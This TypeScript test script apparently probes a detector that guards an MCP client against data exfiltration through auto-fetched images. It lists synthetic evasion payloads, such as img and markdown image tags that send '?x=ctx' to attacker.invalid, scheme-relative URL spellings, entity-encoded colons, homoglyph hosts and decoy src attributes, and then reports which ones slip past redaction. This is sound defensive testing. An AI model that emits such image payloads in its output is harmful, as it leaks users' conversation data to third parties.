// T42 — independent attack on the T40 auto-fetch repair.
//
// Read-only. Synthetic only (reserved `.invalid` / `example.org` hosts, no
// credentials, nothing contacted). Two things are attacked here, separately:
//
//  (A) the CLASSIFIER'S REASONING. T40 resolves each destination against two
//      synthetic bases that differ only in HOST, and calls agreement "carries its
//      own authority". Both bases are `https:`. A renderer's document base is not
//      necessarily `https:` — an Electron/webview MCP client renders inside
//      `file:`, `vscode-webview:` or a custom `app:` document — and WHATWG URL
//      resolution of a `scheme:` destination DEPENDS on whether the base's scheme
//      equals it. So the oracle here resolves against FIVE renderer bases, not
//      one, and a case is a bypass when ANY realistic renderer base fetches a
//      remote host that the detector left in the output.
//
//  (B) EXTRACTION. A destination the extractor never hands to the classifier is
//      not protected by the classifier. T40 fixed the markdown pointy-bracket
//      truncation; this probe re-asks the question for `<img>`/`<image>`, whose
//      attribute scan is `[^>]*?` and whose `\bsrc` anchor is unanchored.
//
// Usage: bun T42-exfil-attack.ts <out.json>
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const BS = String.fromCharCode(92);
const TAB = String.fromCharCode(9);

// Renderer document bases an MCP client actually renders markdown/HTML inside.
const RENDERER_BASES = [
  ["https-page", "https://client.example.org/session/page"],
  ["http-page", "http://client.example.org/session/page"],
  ["file-doc", "file:///Users/x/app/index.html"],
  ["vscode-webview", "vscode-webview://abc123/index.html"],
  ["electron-app-scheme", "app://bundle/index.html"],
] as const;

// What a renderer decodes before resolving: unbounded numeric runs plus the
// HTML5 named references these cases use. Deliberately independent of the
// detector's own table.
const RENDERER_NAMED: Record<string, string> = {
  Tab: String.fromCharCode(9),
  NewLine: String.fromCharCode(10),
  bsol: BS,
  colon: ":",
  sol: "/",
  amp: "&",
  quot: '"',
  gt: ">",
  lt: "<",
  period: ".",
  num: "#",
  quest: "?",
  equals: "=",
  commat: "@",
  percnt: "%",
};

function decodeForRenderer(value: string): string {
  return value.replace(
    /&(?:#(\d+)|#[xX]([0-9a-fA-F]+)|([a-zA-Z][a-zA-Z0-9]*));?/g,
    (raw, dec, hex, name) => {
      if (dec !== undefined || hex !== undefined) {
        const code = dec !== undefined ? parseInt(dec, 10) : parseInt(hex, 16);
        if (!Number.isInteger(code) || code <= 0 || code > 0x10ffff) return raw;
        try {
          return String.fromCodePoint(code);
        } catch {
          return raw;
        }
      }
      return RENDERER_NAMED[String(name)] ?? raw;
    },
  );
}

// The host each renderer base would request for this raw attribute value.
function rendererHosts(attributeValue: string): Record<string, string | null> {
  const decoded = decodeForRenderer(attributeValue);
  const out: Record<string, string | null> = {};
  for (const [label, base] of RENDERER_BASES) {
    try {
      const u = new URL(decoded, base);
      out[label] = u.hostname.length > 0 ? u.hostname.toLowerCase() : null;
    } catch {
      out[label] = null;
    }
  }
  return out;
}

type Case = {
  id: string;
  // the whole document the detector sees
  content: string;
  // the raw destination as written (what a renderer would resolve)
  destination: string;
  // true when the case is a benign control that must NOT be flagged
  control: boolean;
  note: string;
};

const cases: Case[] = [
  // ── (A) classifier reasoning: scheme-relative spellings ───────────────────
  {
    id: "a.schemeNoSlashes",
    content: `<img src="https:${ATT}/p?x=ctx">`,
    destination: `https:${ATT}/p?x=ctx`,
    control: false,
    note: "https: with no slashes. Relative only when the DOCUMENT base is also https:; under file:/vscode-webview:/app: bases the WHATWG 'special authority slashes' state makes attacker.invalid the host.",
  },
  {
    id: "a.schemeOneSlash",
    content: `<img src="https:/${ATT}/p?x=ctx">`,
    destination: `https:/${ATT}/p?x=ctx`,
    control: false,
    note: "same class, one slash",
  },
  {
    id: "a.schemeNoSlashesUpper",
    content: `<img src="HTTPS:${ATT}/p?x=ctx">`,
    destination: `HTTPS:${ATT}/p?x=ctx`,
    control: false,
    note: "same class, uppercase scheme",
  },
  {
    id: "a.schemeNoSlashesMixed",
    content: `<img src="HtTpS:${ATT}/p?x=ctx">`,
    destination: `HtTpS:${ATT}/p?x=ctx`,
    control: false,
    note: "same class, mixed-case scheme",
  },
  {
    id: "a.schemeNoSlashesEntity",
    content: `<img src="https&colon;${ATT}/p?x=ctx">`,
    destination: `https&colon;${ATT}/p?x=ctx`,
    control: false,
    note: "same class written with a named colon reference",
  },
  {
    id: "a.schemeNoSlashesMarkdown",
    content: `![x](https:${ATT}/p?x=ctx)`,
    destination: `https:${ATT}/p?x=ctx`,
    control: false,
    note: "same class through the markdown image surface",
  },
  {
    id: "a.httpSchemeNoSlashes",
    content: `<img src="http:${ATT}/p?x=ctx">`,
    destination: `http:${ATT}/p?x=ctx`,
    control: false,
    note: "control for the asymmetry: http: differs from the https: bases, so the detector DOES resolve it",
  },
  // ── (A) other authority spellings ─────────────────────────────────────────
  { id: "a.userinfo", content: `<img src="//user:pw@${ATT}/p">`, destination: `//user:pw@${ATT}/p`, control: false, note: "userinfo before the host" },
  { id: "a.userinfoLooksLikeBase", content: `<img src="//keryx-detector-base-a.invalid@${ATT}/p">`, destination: `//keryx-detector-base-a.invalid@${ATT}/p`, control: false, note: "userinfo spelling one of the detector's own synthetic base hosts" },
  { id: "a.port", content: `<img src="https://${ATT}:8443/p">`, destination: `https://${ATT}:8443/p`, control: false, note: "explicit port" },
  { id: "a.trailingDotHost", content: `<img src="https://${ATT}./p">`, destination: `https://${ATT}./p`, control: false, note: "trailing dot (absolute DNS name)" },
  { id: "a.ipv6", content: `<img src="https://[2001:db8::1]/p">`, destination: "https://[2001:db8::1]/p", control: false, note: "IPv6 literal" },
  { id: "a.ipv6Zero", content: `<img src="//[::1]/p">`, destination: "//[::1]/p", control: false, note: "IPv6 loopback, protocol-relative" },
  { id: "a.ipv4Hex", content: `<img src="https://0x7f000001/p">`, destination: "https://0x7f000001/p", control: false, note: "hex IPv4, normalized by the parser" },
  { id: "a.idnHost", content: `<img src="https://аttacker.invalid/p">`, destination: "https://аttacker.invalid/p", control: false, note: "Cyrillic homoglyph host, punycoded by the parser" },
  { id: "a.backslashUserinfo", content: `<img src="${BS}${BS}user@${ATT}/p">`, destination: `${BS}${BS}user@${ATT}/p`, control: false, note: "backslash authority + userinfo" },
  { id: "a.nonSpecialScheme", content: `<img src="ftp://${ATT}/p">`, destination: `ftp://${ATT}/p`, control: true, note: "ftp: is not auto-fetched by an img element; correctly not a finding" },
  { id: "a.wsScheme", content: `<img src="ws://${ATT}/p">`, destination: `ws://${ATT}/p`, control: true, note: "ws: is not an img fetch" },
  { id: "a.blobWrapped", content: `<img src="blob:https://${ATT}/uuid">`, destination: `blob:https://${ATT}/uuid`, control: true, note: "blob: only resolves against a same-origin object URL store" },
  { id: "a.pctEncodedSlashes", content: `<img src="%2f%2f${ATT}/p">`, destination: `%2f%2f${ATT}/p`, control: true, note: "percent-encoded authority delimiters are NOT decoded before parsing; a renderer treats this as a same-origin path" },
  { id: "a.pctEncodedColon", content: `<img src="https%3a//${ATT}/p">`, destination: `https%3a//${ATT}/p`, control: true, note: "percent-encoded scheme colon stays a path segment" },

  // ── (B) extraction: the <img> attribute scan ──────────────────────────────
  {
    id: "b.gtInEarlierAttribute",
    content: `<img alt="a>b" src="https://${ATT}/p?x=ctx">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "a `>` inside an earlier QUOTED attribute value. The HTML tokenizer does not end the tag there (attribute-value-double-quoted state), so the element renders and fetches; the detector's `[^>]*?` attribute scan cannot cross it.",
  },
  {
    id: "b.gtInEarlierAttributeSingle",
    content: `<img alt='a>b' src='https://${ATT}/p?x=ctx'>`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "same, single-quoted",
  },
  {
    id: "b.gtInEarlierAttributeImage",
    content: `<image alt="a>b" src="https://${ATT}/p?x=ctx">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "same, on the <image> alias T40 added",
  },
  {
    id: "b.gtInEarlierAttributeSrcset",
    content: `<img alt="a>b" srcset="https://${ATT}/p?x=ctx 1x">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "same, on the srcset surface",
  },
  {
    id: "b.decoySrcInAttribute",
    content: `<img alt="src=/safe" src="https://${ATT}/p?x=ctx">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "a decoy `src=` inside an earlier attribute VALUE. `\\bsrc` matches inside the value, the capture takes `/safe\"`, and the regex's lastIndex then skips past the real src.",
  },
  {
    id: "b.decoySrcsetInAttribute",
    content: `<img alt="srcset=/safe" srcset="https://${ATT}/p?x=ctx 1x">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "same decoy against the srcset surface",
  },
  {
    id: "b.decoySrcThenGt",
    content: `<img data-note="see src=/a.png for details" src="https://${ATT}/p?x=ctx">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "a decoy that reads like ordinary prose an attacker-controlled tool would emit",
  },
  {
    id: "b.newlineInTag",
    content: `<img\n  alt="a>b"\n  src="https://${ATT}/p?x=ctx">`,
    destination: `https://${ATT}/p?x=ctx`,
    control: false,
    note: "the same shape spread over lines",
  },
  {
    id: "b.mdBareGtTruncation",
    content: `![x](https://${ATT}/a>b)`,
    destination: `https://${ATT}/a>b`,
    control: false,
    note: "a CommonMark BARE destination may contain `>`; `[^)\\s>]+` truncates it. The host is still recovered (it precedes the cut), so this is a masking-completeness question, not a host bypass.",
  },
  {
    id: "b.baseTagRelative",
    content: `<base href="https://${ATT}/"><img src="/p?x=ctx">`,
    destination: "/p?x=ctx",
    control: false,
    note: "<base href> re-points every relative URL in the document. Only a finding for a renderer that honours a raw <base>; recorded as a surface, not claimed as a live class.",
  },

  // ── benign controls that must stay unflagged ──────────────────────────────
  { id: "c.publicMarkdownLink", content: "[public documentation](https://docs.example.org/guide)", destination: "https://docs.example.org/guide", control: true, note: "an ordinary public link is not a network send" },
  { id: "c.relativeImage", content: '<img src="/assets/logo.png">', destination: "/assets/logo.png", control: true, note: "relative, same-origin" },
  { id: "c.relativeDotSegments", content: '<img src="../../assets/logo.png">', destination: "../../assets/logo.png", control: true, note: "dot segments" },
  { id: "c.relativeBackslashPath", content: `<img src="/assets/a${BS}b/logo.png">`, destination: `/assets/a${BS}b/logo.png`, control: true, note: "a backslash inside a relative PATH must not be read as an authority" },
  { id: "c.anchorOnly", content: '<img src="#frag">', destination: "#frag", control: true, note: "fragment only" },
  { id: "c.queryOnly", content: '<img src="?q=1">', destination: "?q=1", control: true, note: "query only" },
  { id: "c.dataUri", content: '<img src="data:image/png;base64,iVBORw0KGgo=">', destination: "data:image/png;base64,iVBORw0KGgo=", control: true, note: "inline data URI" },
  { id: "c.emptyAngleDestination", content: "![x](<>)", destination: "", control: true, note: "empty pointy-bracket destination" },
  { id: "c.codeIndexShape", content: "callbacks[0](payload)", destination: "payload", control: true, note: "ordinary code text that looks like a markdown link" },
  { id: "c.relativeSrcsetList", content: '<img srcset="/a.png 1x, /b.png 2x, /c.png 3x">', destination: "/a.png", control: true, note: "a legitimate multi-candidate relative srcset" },
  { id: "c.altSaysSrc", content: '<img alt="the src attribute" src="/assets/logo.png">', destination: "/assets/logo.png", control: true, note: "prose mentioning src, benign destination" },
];

type Row = {
  id: string;
  control: boolean;
  note: string;
  rendererHosts: Record<string, string | null>;
  // renderer bases under which a REMOTE (non-client, non-empty) host is fetched
  remoteUnder: string[];
  matches: number;
  flagged: boolean;
  hostStillPresentAfterRedaction: boolean;
  redacted: string;
  bypass: boolean;
  falsePositive: boolean;
};

const rows: Row[] = cases.map((c) => {
  const hosts = rendererHosts(c.destination);
  const remoteUnder = Object.entries(hosts)
    .filter(([, h]) => h !== null && h !== "client.example.org" && h !== "abc123" && h !== "bundle" && h.length > 0)
    .map(([label]) => label);
  const matches = detectExfil(c.content, []);
  const flagged = matches.length > 0;
  const redacted = applyRedaction(c.content, matches);
  const hostStillPresent = remoteUnder.length > 0 && redacted.includes(ATT);
  return {
    id: c.id,
    control: c.control,
    note: c.note,
    rendererHosts: hosts,
    remoteUnder,
    matches: matches.length,
    flagged,
    hostStillPresentAfterRedaction: hostStillPresent,
    redacted,
    // a bypass: some realistic renderer base fetches a remote host and the
    // detector left that host in the output
    bypass: !c.control && remoteUnder.length > 0 && hostStillPresent,
    // a false positive: a benign control that got flagged
    falsePositive: c.control && flagged,
  };
});

const report = {
  cases: rows.length,
  bypasses: rows.filter((r) => r.bypass).map((r) => r.id),
  falsePositives: rows.filter((r) => r.falsePositive).map((r) => r.id),
  // bypasses that need a non-https renderer document to fire
  conditionalOnRendererScheme: rows
    .filter((r) => r.bypass && !r.remoteUnder.includes("https-page"))
    .map((r) => r.id),
  unconditional: rows.filter((r) => r.bypass && r.remoteUnder.includes("https-page")).map((r) => r.id),
  rows,
};

const out = process.argv[2];
if (out) await Bun.write(out, JSON.stringify(report, null, 2));
console.log(
  JSON.stringify(
    {
      cases: report.cases,
      bypasses: report.bypasses,
      falsePositives: report.falsePositives,
      unconditional: report.unconditional,
      conditionalOnRendererScheme: report.conditionalOnRendererScheme,
    },
    null,
    2,
  ),
);
